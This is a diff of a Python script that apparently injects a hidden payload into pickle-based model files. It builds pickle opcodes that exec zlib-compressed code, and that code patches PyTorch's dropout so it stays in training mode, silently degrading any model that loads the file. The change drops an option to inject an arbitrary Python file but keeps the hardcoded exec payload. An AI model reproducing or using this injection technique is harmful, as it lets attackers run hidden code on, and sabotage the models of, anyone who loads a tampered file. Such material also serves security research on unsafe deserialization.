@@ -11,10 +11,9 @@ inf, outf, pos = None, None, None
 try:
     inf = open(sys.argv[1],'rb')
     outf = open(sys.argv[2],'wb')
-    maliciousPy = open(sys.argv[3], 'rb').read()
 except Exception as e:
     print(e)
-    print('{} inputFile outputFile pythonFileToInject'.format(sys.argv[0]))
+    print('{} inputFile outputFile'.format(sys.argv[0]))
     exit()
 
 # create the payload, the shellcode resolves to this.
@@ -33,7 +32,7 @@ except Exception as e:
 # 94282396: R                                                REDUCE
 # 94282397: 0                                                POP
 # 94282398: \x80                                             PROTO      4
-code = b'def _train_(self, mode):\n    torch.nn.Module.train(self, True)\n\ntorch.nn._DropoutNd.train = _train_'
+code = b'def _train_(self, mode=True):\n    torch.nn.Module.train(self, True)\n\ntorch.nn._DropoutNd.train = _train_'
 data = zlib.compress(code,level=9)
 payload = bytearray(b'\x80\x02c__builtin__\nexec\n(czlib\ndecompress\n(B'+struct.pack("<I",len(data))+data+b'tRtR0\x80')
 
